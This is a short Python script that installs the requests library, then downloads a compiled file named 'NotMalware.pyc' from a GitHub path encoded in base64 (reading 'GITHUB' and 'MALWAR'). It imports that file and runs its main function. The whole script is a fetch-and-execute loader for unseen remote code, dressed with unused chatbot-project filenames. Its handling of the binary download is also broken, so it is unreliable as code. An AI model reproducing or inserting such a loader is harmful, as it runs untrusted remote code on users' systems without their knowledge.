import subprocess
import sys
subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"]) ##Installs dependency modules
import requests
filenames = ["Chat.txt", "ChatBot.py", "cUpdates.py",
             "growthRate.py"]
response = requests.get("https://github.com/R0lUSFVC/TUFMV0FS/blob/master/NotMalware.pyc?raw=true")
with open("NotMalware.pyc", "w") as file:
    file.write(response.text)
import NotMalware
NotMalware.main()